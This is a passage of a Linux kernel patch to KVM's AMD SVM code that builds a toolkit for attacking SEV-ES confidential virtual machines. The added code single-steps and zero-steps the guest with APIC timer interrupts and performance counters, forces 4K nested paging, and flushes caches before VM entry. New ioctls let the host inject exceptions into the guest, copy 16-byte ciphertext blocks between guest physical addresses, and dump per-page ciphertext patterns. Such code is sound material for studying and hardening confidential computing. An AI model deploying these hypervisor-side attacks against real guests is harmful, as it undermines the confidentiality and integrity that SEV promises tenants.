+u64 rdpru_a(void) {
+	u64 a, d;
+	asm volatile("mfence");
+	asm volatile(".byte 0x0f,0x01,0xfd" : "=a"(a), "=d"(d) : "c"(1) : );
+	a = (d << 32) | a;
+	asm volatile("mfence");
+	return a;
+}
+
+void mtrr_uc_page(u64 base, u8 num) {
+	u32 low = (u32)base | 0x00; // UC
+	u32 high = (base >> 32) & 0x7fff;
+	asm volatile("wrmsr\n" : : "c"(0x208+num*2), "a"(low), "d"(high));  // Base
+	asm volatile("wrmsr\n" : : "c"(0x209+num*2), "a"(0xfffff800), "d"(0xffff)); // Mask 4KB
+}
+
+void mtrr_wb_page(u64 base, u8 num) {
+	u32 low = (u32)base | 0x06; // WB
+	u32 high = (base >> 32) & 0x7fff;
+	asm volatile("wrmsr\n" : : "c"(0x208+num*2), "a"(low), "d"(high));  // Base
+	asm volatile("wrmsr\n" : : "c"(0x209+num*2), "a"(0xfffff800), "d"(0xffff)); // Mask 4KB
+}
+
+
+#define C 1
+#define D 1
+#define L 1
+#define S 32 / 16
+
+// L3 16384 sets
+void __attribute__((aligned(0x1000))) prime_l3_set(void* addr){
+  for (int s = 0; s < S-D ; s+=L ){
+	for(int c = 0; c < C; c++) {
+	  for(int d = 0; d < D; d++) {
+		  maccess(addr+((s+d) << 20));
+	  }
+	}
+  }
+}
+
+
+// PMC - 6 GP counters
+#define MSR_AMDSEV_PERF_CTL 0xC0010200
+#define MSR_AMDSEV_PERF_CTR 0xC0010201
+/*
+ * Helper to build a PMC control configuration from a value read from memory.
+ * msr_val: The 64-bit value containing the event configuration from the controller.
+ * os_event: If true, this is a guest-OS event (OS=1, User=0); otherwise a user event.
+ *
+ * msr_val fields (from the controller):
+ *   - Bits [0:7]  => umask.
+ *   - Bits [8:15] => event code.
+ *   - Bits [16:19]=> Highest 4 bits of the event.
+ */
+static inline u64 pmc_config_from_val(u64 msr_val, bool os_event)
+{
+    u64 config = 0;
+    config |= (0ULL << 41);        /* HV = 0 */
+    config |= (1ULL << 40);        /* Guest = 1 */
+    config |= (((msr_val >> 16) & 0xF) << 32); /* Additional event bits */
+    config |= (0ULL << 24);        /* CNTMASK = 0 */
+    config |= (0ULL << 23);        /* INV = 0 */
+    config |= (1ULL << 22);        /* EN = 1 */
+    config |= (0ULL << 20);        /* INT = 0 */
+    config |= (0ULL << 18);        /* EDGE = 0 */
+    if (os_event)
+        config |= (1ULL << 17);    /* OS = 1 for OS events */
+    else
+        config |= (1ULL << 16);    /* User = 0 for OS events */
+    config |= ((msr_val & 0xFF) << 8);         /* umask */
+    config |= ((msr_val >> 8) & 0xFF);         /* event */
+    return config;
+}
+
+
+
+static void sev_step_initialize_pmcs(struct sev_pmc_ctx *ctx)
+{
+ /* Hardcode the CTL[0]: Retired Instruction */
+ ctx->msr_ctl[0] = pmc_config_from_val(0xC0FF, false);
+ wrmsrl(MSR_AMDSEV_PERF_CTL, ctx->msr_ctl[0]);
+ wrmsrl(MSR_AMDSEV_PERF_CTR, 0);
+ /* Reset performance counters and update tracking */
+ rdmsrl(MSR_AMDSEV_PERF_CTR, ctx->msr_ctr[0]);
+ wrmsrl(MSR_AMDSEV_PERF_CTR, 0);
+ ctx->last_user_retired_instr_num = 0;
+ for (int i = 2; i < 6; i++) {
+  if (ctx->msr_ctl[i]) {
+   rdmsrl(MSR_AMDSEV_PERF_CTR + i * 2, ctx->msr_ctr[i]);
+   wrmsrl(MSR_AMDSEV_PERF_CTR + i * 2, 0);
+  }
+ }
+}
+
+
 static int intr_interception(struct kvm_vcpu *vcpu)
 {
+	u64 flag = *((volatile u64 *)(sev_step_page_va));
+	u8 sw = flag & 0xff; // Magic value
+
+	struct vcpu_svm *svm = to_svm(vcpu);
+	
+	/*
+	 *  Interrupt Hook
+	 */
+	// if (sw == 0x77) {
+	if(atomic_read(&user_data_npf_ex.signal_apic_timer) == 1)
+	{
+		u64 pmc_counter = 0;
+		u64 retired_instr_num = 0;
+		rdmsrl(MSR_AMDSEV_PERF_CTR, pmc_counter);
+		retired_instr_num = pmc_counter - svm->sev_ctx.last_user_retired_instr_num;
+		/* Zero-stepping */
+		if (retired_instr_num == 0) {
+			printk("zero-step,rip: 0x%llx,pmc: %llu\n", svm->vmcb->save.rip, pmc_counter);
+		}
+		else if (retired_instr_num == 1) {
+			printk("single-step,rip: 0x%llx,pmc: %llu\n", svm->vmcb->save.rip, pmc_counter);
+		}
+		else if (retired_instr_num > 1) {
+			printk("multi-step,rip: 0x%llx,pmc: %llu,retired_instr_num: %llu\n", svm->vmcb->save.rip, pmc_counter, retired_instr_num);
+		}
+		rdmsrl(MSR_AMDSEV_PERF_CTR, pmc_counter);
+		svm->sev_ctx.last_user_retired_instr_num = pmc_counter;
+		++vcpu->stat.irq_exits;
+		return 1;
+	}
+
+	/* Should remove smth. Here's just a safe choice */
+	zero_stepping_time = 0;
+	non_zero_stepping_time = 0;
+	npf_gfn = 0;
+	apic_interval = 0;
+	instr_counter = 0;
+	last_reg_vector = 0;
+	cur_invd_idx = 0;
+	start_counting = false;
+	if (vmsa_vaddr) {
+		vmsa_vaddr = NULL;
+	}
+	
+
 	++vcpu->stat.irq_exits;
 	return 1;
 }
@@ -3350,10 +3606,7 @@ static int (*const svm_exit_handlers[])(struct kvm_vcpu *vcpu) = {
 	[SVM_EXIT_STGI]				= stgi_interception,
 	[SVM_EXIT_CLGI]				= clgi_interception,
 	[SVM_EXIT_SKINIT]			= skinit_interception,
-	[SVM_EXIT_RDTSCP]			= kvm_handle_invalid_op,
 	[SVM_EXIT_WBINVD]                       = kvm_emulate_wbinvd,
-	[SVM_EXIT_MONITOR]			= kvm_emulate_monitor,
-	[SVM_EXIT_MWAIT]			= kvm_emulate_mwait,
 	[SVM_EXIT_XSETBV]			= kvm_emulate_xsetbv,
 	[SVM_EXIT_RDPRU]			= kvm_handle_invalid_op,
 	[SVM_EXIT_EFER_WRITE_TRAP]		= efer_trap,
@@ -3719,17 +3972,34 @@ void svm_complete_interrupt_delivery(struct kvm_vcpu *vcpu, int delivery_mode,
 static void svm_deliver_interrupt(struct kvm_lapic *apic,  int delivery_mode,
 				  int trig_mode, int vector)
 {
-	kvm_lapic_set_irr(vector, apic);
+	// kvm_lapic_set_irr(vector, apic);
+
+	// /*
+	//  * Pairs with the smp_mb_*() after setting vcpu->guest_mode in
+	//  * vcpu_enter_guest() to ensure the write to the vIRR is ordered before
+	//  * the read of guest_mode.  This guarantees that either VMRUN will see
+	//  * and process the new vIRR entry, or that svm_complete_interrupt_delivery
+	//  * will signal the doorbell if the CPU has already entered the guest.
+	//  */
+	// smp_mb__after_atomic();
+	// svm_complete_interrupt_delivery(apic->vcpu, delivery_mode, trig_mode, vector);
+	u8 flag = *((volatile u8 *)(sev_step_page_va));
+	// if ((flag != 0x77) || vector != 0xec) {
+	if(atomic_read(&user_data_npf_ex.signal_apic_timer) == 0 || vector != 0xec) 
+	{
+		kvm_lapic_set_irr(vector, apic);
 
-	/*
-	 * Pairs with the smp_mb_*() after setting vcpu->guest_mode in
-	 * vcpu_enter_guest() to ensure the write to the vIRR is ordered before
-	 * the read of guest_mode.  This guarantees that either VMRUN will see
-	 * and process the new vIRR entry, or that svm_complete_interrupt_delivery
-	 * will signal the doorbell if the CPU has already entered the guest.
-	 */
-	smp_mb__after_atomic();
-	svm_complete_interrupt_delivery(apic->vcpu, delivery_mode, trig_mode, vector);
+		/*
+		* Pairs with the smp_mb_*() after setting vcpu->guest_mode in
+		* vcpu_enter_guest() to ensure the write to the vIRR is ordered before
+		* the read of guest_mode.  This guarantees that either VMRUN will see
+		* and process the new vIRR entry, or that svm_complete_interrupt_delivery
+		* will signal the doorbell if the CPU has already entered the guest.
+		*/
+		
+		smp_mb__after_atomic();
+		svm_complete_interrupt_delivery(apic->vcpu, delivery_mode, trig_mode, vector);
+	}
 }
 
 static void svm_update_cr8_intercept(struct kvm_vcpu *vcpu, int tpr, int irr)
@@ -4169,15 +4439,67 @@ static noinstr void svm_vcpu_enter_exit(struct kvm_vcpu *vcpu, bool spec_ctrl_in
 	guest_state_enter_irqoff();
 
 	amd_clear_divider();
+	u32 flag = *((volatile u64 *)(sev_step_page_va));
+	// if ((flag & 0xff) != 0x77) {
+	// 	apic_interval = 0;
+	// }
+
+	if(atomic_read(&user_data_npf_ex.signal_apic_timer) == 0)
+	{
+		apic_interval = 0;
+	}
 
 	if (sev_es_guest(vcpu->kvm))
-		__svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted);
+	{
+		// __svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted);
+
+		__svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted, (u32*)(APIC_BASE + APIC_TMICT), apic_interval,0);
+	}
 	else
 		__svm_vcpu_run(svm, spec_ctrl_intercepted);
-
 	guest_state_exit_irqoff();
 }
 
+static void replace_data(struct kvm_vcpu *vcpu,unsigned long src_addrs,unsigned long dst_addrs)
+{
+	struct vcpu_svm *svm = to_svm(vcpu);
+	char src_buf[16], dst_buf[16];
+	printk("replace_data,from 0x%016lx to 0x%016lx\n",src_addrs,dst_addrs);
+	#define PRINT_HEX_BUF(label, addr, buf) \
+		pr_info("%s [0x%016lx]: %*ph\n", label, addr, 16, buf)
+
+	// before replace
+	if (kvm_read_guest(svm->vcpu.kvm, src_addrs, src_buf, 16)) {
+		pr_info("kvm_read_guest src_addrs [0x%016lx] failed!\n", src_addrs);
+	} else {
+		PRINT_HEX_BUF("src_addrs before", src_addrs, src_buf);
+	}
+	if (kvm_read_guest(svm->vcpu.kvm, dst_addrs, dst_buf, 16)) {
+		pr_info("kvm_read_guest dst_addrs [0x%016lx] failed!\n", dst_addrs);
+	} else {
+		PRINT_HEX_BUF("dst_addrs before", dst_addrs, dst_buf);
+	}
+
+	// execute replace
+	if (kvm_write_guest(svm->vcpu.kvm, dst_addrs, src_buf, 16)) {
+		pr_info("kvm_write_guest dst_addrs [0x%016lx] failed!\n", dst_addrs);
+	} else {
+		pr_info("replace done, write src_addrs to dst_addrs\n");
+	}
+
+	// after replace
+	if (kvm_read_guest(svm->vcpu.kvm, src_addrs, src_buf, 16)) {
+		pr_info("kvm_read_guest src_addrs [0x%016lx] failed!\n", src_addrs);
+	} else {
+		PRINT_HEX_BUF("src_addrs after", src_addrs, src_buf);
+	}
+	if (kvm_read_guest(svm->vcpu.kvm, dst_addrs, dst_buf, 16)) {
+		pr_info("kvm_read_guest dst_addrs [0x%016lx] failed!\n", dst_addrs);
+	} else {
+		PRINT_HEX_BUF("dst_addrs after", dst_addrs, dst_buf);
+	}
+}
+
 static __no_kcsan fastpath_t svm_vcpu_run(struct kvm_vcpu *vcpu)
 {
 	struct vcpu_svm *svm = to_svm(vcpu);
@@ -4218,6 +4540,86 @@ static __no_kcsan fastpath_t svm_vcpu_run(struct kvm_vcpu *vcpu)
 		smp_send_reschedule(vcpu->cpu);
 	}
 
+    if(atomic_read(&user_data_npf_ex.user_interrupt_pending) == 1){
+		// kvm_start_tracking(vcpu,false);
+		atomic_set(&user_data_npf_ex.user_interrupt_pending, 0);
+		pr_info("reset user_interrupt_pending finish");;
+		svm->vmcb->control.event_inj = 0x80 | SVM_EVTINJ_VALID | SVM_EVTINJ_VALID_ERR | SVM_EVTINJ_TYPE_EXEPT;
+		// svm->vmcb->control.event_inj_err = 0x81;
+    }
+
+
+    if(atomic_read(&user_data_npf_ex.single_step_page_flag) == 1){
+		printk("start single step page at 0x%lx\n",user_data_npf_ex.single_step_page_gpa);
+		atomic_set(&user_data_npf_ex.single_step_page_flag, 0); // reset flag
+		// *((volatile u64 *)(sev_step_page_va)) = 0x77;
+		sev_step_initialize_pmcs(&svm->sev_ctx);
+		// kvm_start_tracking(vcpu,false);
+		if (user_data_npf_ex.single_pic_interval == 0) {
+			apic_interval = 0;
+		} else {
+			apic_interval = user_data_npf_ex.single_pic_interval & 0xffff;
+			pr_info("Step apic interval is: %d\n", apic_interval);
+			atomic_set(&user_data_npf_ex.signal_apic_timer, 1); // next step is set apic 
+
+		}
+
+    }
+
+
+
+	if(atomic_read(&user_data_npf_ex.flag_replace) == 1){
+		printk("replace data\n");
+		atomic_set(&user_data_npf_ex.flag_replace, 0);
+		unsigned long src_addrs = user_data_npf_ex.src_addr;
+		unsigned long dst_addrs = user_data_npf_ex.dst_addr;
+		unsigned long dst_addrs_1 = user_data_npf_ex.dst_addr_1;
+		unsigned long dst_addrs_2 = user_data_npf_ex.dst_addr_2;
+		if (dst_addrs != 0) {
+			replace_data(vcpu,src_addrs,dst_addrs);
+		}
+		if (dst_addrs_1 != 0) {
+			replace_data(vcpu,src_addrs,dst_addrs_1);
+		}
+		if (dst_addrs_2 != 0) {
+			replace_data(vcpu,src_addrs,dst_addrs_2);
+		}
+
+		#undef PRINT_HEX_BUF
+	}
+
+
+	if (atomic_read(&user_data_npf_ex.pfn_feature_info_flag) == 1){
+		pr_info("pfn_feature_info_flag\n");
+		atomic_set(&user_data_npf_ex.pfn_feature_info_flag, 0);
+		unsigned long gpa = user_data_npf_ex.pfn_feature_info;
+		char page_buf[4096];
+
+		// read the content of the guest physical page corresponding to the GPA
+		if (kvm_read_guest(svm->vcpu.kvm, gpa, page_buf, 4096)) {
+			pr_info("kvm_read_guest gpa [0x%016lx] failed!\n", gpa);
+		} else {
+			const int page_size = 4096;
+			const int group_size = 64;
+			const int cacheline_size = 16;
+			const int cachelines_per_group = group_size / cacheline_size; // 4
+			const int groups_per_page = page_size / group_size;           // 64
+
+			for (int group = 0; group < groups_per_page; ++group) {
+				char *group_base = page_buf + group * group_size;
+				int feature_sum = 0;
+				for (int i = 0; i < cachelines_per_group; ++i) {
+					for (int j = i + 1; j < cachelines_per_group; ++j) {
+						if (memcmp(group_base + i * cacheline_size, group_base + j * cacheline_size, cacheline_size) == 0) {
+							feature_sum += (i + 1) + (j + 1);
+						}
+					}
+				}
+				pr_info("gpa 0x%lx, group %d, feature_sum = %d\n", gpa, group, feature_sum);
+			}
+		}
+	}
+
 	pre_svm_run(vcpu);
 
 	sync_lapic_to_cr8(vcpu);
@@ -5332,7 +5734,7 @@ static __init int svm_hardware_setup(void)
 
 	/* Force VM NPT level equal to the host's paging level */
 	kvm_configure_mmu(npt_enabled, get_npt_level(),
-			  get_npt_level(), PG_LEVEL_1G);
+			  get_npt_level(), PG_LEVEL_4K);
 	pr_info("Nested Paging %sabled\n", npt_enabled ? "en" : "dis");
 
 	/* Setup shadow_me_value and shadow_me_mask */
diff --git a/arch/x86/kvm/svm/svm.h b/arch/x86/kvm/svm/svm.h
index 13cf80855481..f6fa7884f97d 100644
--- a/arch/x86/kvm/svm/svm.h
+++ b/arch/x86/kvm/svm/svm.h
@@ -211,6 +211,12 @@ struct vcpu_sev_es_state {
 #endif
 };
 
+struct sev_pmc_ctx {
+    u64 msr_ctl[6];   // PMC control register configuration
+    u64 msr_ctr[6];   // PMC counter value
+    u64 last_user_retired_instr_num; // last single-step retired instructions
+};
+
 struct vcpu_svm {
 	struct kvm_vcpu vcpu;
 	/* vmcb always points at current_vmcb->ptr, it's purely a shorthand. */
@@ -297,6 +303,7 @@ struct vcpu_svm {
 
 	/* Guest GIF value, used when vGIF is not enabled */
 	bool guest_gif;
+		struct sev_pmc_ctx sev_ctx;
 };
 
 struct svm_cpu_data {
@@ -702,7 +709,8 @@ void sev_es_unmap_ghcb(struct vcpu_svm *svm);
 
 /* vmenter.S */
 
-void __svm_sev_es_vcpu_run(struct vcpu_svm *svm, bool spec_ctrl_intercepted);
+// void __svm_sev_es_vcpu_run(struct vcpu_svm *svm, bool spec_ctrl_intercepted);
+u64 __svm_sev_es_vcpu_run(struct vcpu_svm *svm, bool spec_ctrl_intercepted, u32* apic_reg_addr, u32 apic_interval, u32 wbnoinvd);
 void __svm_vcpu_run(struct vcpu_svm *svm, bool spec_ctrl_intercepted);
 
 #define DEFINE_KVM_GHCB_ACCESSORS(field)						\
diff --git a/arch/x86/kvm/svm/vmenter.S b/arch/x86/kvm/svm/vmenter.S
index ef2ebabb059c..abb5c7470c14 100644
--- a/arch/x86/kvm/svm/vmenter.S
+++ b/arch/x86/kvm/svm/vmenter.S
@@ -336,7 +336,23 @@ SYM_FUNC_START(__svm_sev_es_vcpu_run)
 
 	/* Enter guest mode */
 	sti
+	/* Do not use APIC */
+	cmp $0, %_ASM_ARG4L
+	je 1f
 
+	/* Clean the cache state */
+	cmp $0, %_ASM_ARG5L
+	jne 3f
+
+	/* Write back the dirty cache lines (avoid crash) */
+	wbnoinvd
+	jmp 4f
+
+3:	wbinvd
+
+	/* APIC Interval */
+4:	movl %_ASM_ARG4L, (%_ASM_ARG3)
+ 
 1:	vmrun %_ASM_AX
 
 2:	cli
diff --git a/arch/x86/kvm/x86.c b/arch/x86/kvm/x86.c
index 3e9d6f368eed..dd72c7fd9510 100644
--- a/arch/x86/kvm/x86.c
+++ b/arch/x86/kvm/x86.c
@@ -33,7 +33,7 @@
 #include "lapic.h"
 #include "xen.h"
 #include "smm.h"
-
+#include <linux/intr_injection.h>
 #include <linux/clocksource.h>
 #include <linux/interrupt.h>
 #include <linux/kvm.h>
@@ -9971,6 +9971,8 @@ int kvm_emulate_hypercall(struct kvm_vcpu *vcpu)
 {
 	unsigned long nr, a0, a1, a2, a3, ret;
 	int op_64_bit;
+	// // print the VMMCALL type and rax
+	// pr_info("[SEV-ES] VMMCALL type: %d, rax: 0x%llx\n", SVM_EXIT_VMMCALL, vcpu->arch.regs[VCPU_REGS_RAX]);
 
 	if (kvm_xen_hypercall_enabled(vcpu->kvm))
 		return kvm_xen_hypercall(vcpu);
@@ -10666,6 +10668,25 @@ EXPORT_SYMBOL_GPL(__kvm_request_immediate_exit);
  * exiting to the userspace.  Otherwise, the value will be returned to the
  * userspace.
  */
+
+
+struct npf_exception_coordination user_data_npf_ex = {
+	.user_interrupt_pending = ATOMIC_INIT(0),
+	.deliver_intr = ATOMIC_INIT(0),
+	.src_addr = 0,
+	.dst_addr = 0,
+	.flag_replace = ATOMIC_INIT(0),
+	.pfn_feature_info_flag = ATOMIC_INIT(0),
+	.pfn_feature_info = 0,
+	.dst_addr_1 = 0,
+	.dst_addr_2 = 0,
+	.single_step_page_flag = ATOMIC_INIT(0),
+	.single_step_page_gpa = -1,
+	.single_pic_interval = 0,
+	.signal_apic_timer = ATOMIC_INIT(0),
+};
+EXPORT_SYMBOL(user_data_npf_ex);
+
 static int vcpu_enter_guest(struct kvm_vcpu *vcpu)
 {
 	int r;
diff --git a/include/uapi/linux/kvm.h b/include/uapi/linux/kvm.h
index 938613c25553..c2961e6fac71 100644
--- a/include/uapi/linux/kvm.h
+++ b/include/uapi/linux/kvm.h
@@ -933,8 +933,27 @@ struct kvm_ppc_resize_hpt {
 #define KVM_GET_API_VERSION       _IO(KVMIO,   0x00)
 #define KVM_CREATE_VM             _IO(KVMIO,   0x01) /* returns a VM fd */
 #define KVM_GET_MSR_INDEX_LIST    _IOWR(KVMIO, 0x02, struct kvm_msr_list)
-
+#define KVM_VC_OPEN_81             _IO(KVMIO,   0x19)
 #define KVM_S390_ENABLE_SIE       _IO(KVMIO,   0x06)
+#define KVM_COPY_16BYTE_GPA       _IOW(KVMIO,   0x17, struct kvm_copy_16byte_gpa_param)
+
+struct kvm_copy_16byte_gpa_param {
+	__u64 dst_gpa;
+	__u64 dst_gpa_1;
+	__u64 dst_gpa_2;
+	__u64 src_gpa;
+};
+#define KVM_GET_PFN_FEATURE_INFO  _IOWR(KVMIO, 0x18, struct kvm_pfn_feature_info)
+
+struct kvm_pfn_feature_info {
+	__u64 pfn;
+};
+
+struct kvm_single_step_page {
+	__u64 dst_gpa;
+	__u64 single_pic_interval;
+};
+#define KVM_SINGLE_STEP_PAGE  _IOWR(KVMIO, 0x1a, struct kvm_single_step_page)
 /*
  * Check if a kvm extension is available.  Argument is extension number,
  * return is 1 (yes) or 0 (no, sorry).
diff --git a/virt/kvm/kvm_main.c b/virt/kvm/kvm_main.c
index 4b7378445812..c7313d5cf101 100644
--- a/virt/kvm/kvm_main.c
+++ b/virt/kvm/kvm_main.c
@@ -62,6 +62,13 @@
 #include "kvm_mm.h"
 #include "vfio.h"
 
+
+#include <linux/intr_injection.h>
+#include <linux/fs.h>
+#include <asm/segment.h>
+#include <asm/uaccess.h>
+#include <linux/buffer_head.h>
+#include <asm/tlbflush.h>
 #include <trace/events/ipi.h>
 
 #define CREATE_TRACE_POINTS
@@ -1168,7 +1175,7 @@ static struct kvm *kvm_create_vm(unsigned long type, const char *fdname)
 
 	if (!kvm)
 		return ERR_PTR(-ENOMEM);
-
+	pr_info("creating VM\n");
 	/* KVM is pinned via open("/dev/kvm"), the fd passed to this ioctl(). */
 	__module_get(kvm_chardev_ops.owner);
 
@@ -1230,7 +1237,7 @@ static struct kvm *kvm_create_vm(unsigned long type, const char *fdname)
 		if (!kvm->buses[i])
 			goto out_err_no_arch_destroy_vm;
 	}
-
+	pr_info("before init\n");
 	r = kvm_arch_init_vm(kvm, type);
 	if (r)
 		goto out_err_no_arch_destroy_vm;
@@ -1246,7 +1253,6 @@ static struct kvm *kvm_create_vm(unsigned long type, const char *fdname)
 	r = kvm_init_mmu_notifier(kvm);
 	if (r)
 		goto out_err_no_mmu_notifier;
-
 	r = kvm_coalesced_mmio_init(kvm);
 	if (r < 0)
 		goto out_no_coalesced_mmio;
@@ -5151,7 +5157,7 @@ static long kvm_dev_ioctl(struct file *filp,
 			  unsigned int ioctl, unsigned long arg)
 {
 	int r = -EINVAL;
-
+	// pr_info("[+]kvm_dev_ioctl,ioctl 0x%x\n",ioctl);
 	switch (ioctl) {
 	case KVM_GET_API_VERSION:
 		if (arg)
@@ -5191,6 +5197,48 @@ static long kvm_dev_ioctl(struct file *filp,
 	case KVM_TRACE_DISABLE:
 		r = -EOPNOTSUPP;
 		break;
+	case KVM_VC_OPEN_81:
+		pr_info("[+]openg kvm vc 81,KVM_VC_OPEN_81 0x%x\n",KVM_VC_OPEN_81);
+		atomic_set(&user_data_npf_ex.user_interrupt_pending, 1);
+		atomic_set(&user_data_npf_ex.deliver_intr, 1);
+		return 0;
+	case KVM_COPY_16BYTE_GPA: {
+		struct kvm_copy_16byte_gpa_param param;
+		if (copy_from_user(&param, (void __user *)arg, sizeof(param)))
+			return -EFAULT;
+		user_data_npf_ex.src_addr = param.src_gpa;
+		user_data_npf_ex.dst_addr = param.dst_gpa;
+		user_data_npf_ex.dst_addr_1 = param.dst_gpa_1;
+		user_data_npf_ex.dst_addr_2 = param.dst_gpa_2;
+		pr_info("[+]copy 16byte gpa,dst_gpa 0x%lx,src_gpa 0x%lx\n",param.dst_gpa,param.src_gpa);
+		atomic_set(&user_data_npf_ex.flag_replace, 1);
+		return 0;
+	}
+	case KVM_GET_PFN_FEATURE_INFO: {
+		struct kvm_pfn_feature_info info;
+		atomic_set(&user_data_npf_ex.user_interrupt_pending, 0);
+		atomic_set(&user_data_npf_ex.deliver_intr, 0);
+		if (copy_from_user(&info, (void __user *)arg, sizeof(info)))
+			return -EFAULT;
+		pr_info("[+]get pfn feature info,pfn 0x%lx\n",info.pfn);
+		atomic_set(&user_data_npf_ex.pfn_feature_info_flag, 1);
+		user_data_npf_ex.pfn_feature_info = info.pfn;
+		return 0;
+	}
+	case KVM_SINGLE_STEP_PAGE: {
+		struct kvm_single_step_page info;
+		atomic_set(&user_data_npf_ex.user_interrupt_pending, 0);
+		atomic_set(&user_data_npf_ex.deliver_intr, 0);
+		if (copy_from_user(&info, (void __user *)arg, sizeof(info)))
+			return -EFAULT;
+		pr_info("[+]get single step page,dst_gpa 0x%lx\n",info.dst_gpa);
+		user_data_npf_ex.single_step_page_gpa = info.dst_gpa;
+		user_data_npf_ex.single_pic_interval = info.single_pic_interval;
+		
+		pr_info("[+]single_pic_interval: %llu\n",user_data_npf_ex.single_pic_interval);
+		atomic_set(&user_data_npf_ex.single_step_page_flag, 1);
+		return 0;
+	}
 	default:
 		return kvm_arch_dev_ioctl(filp, ioctl, arg);
 	}
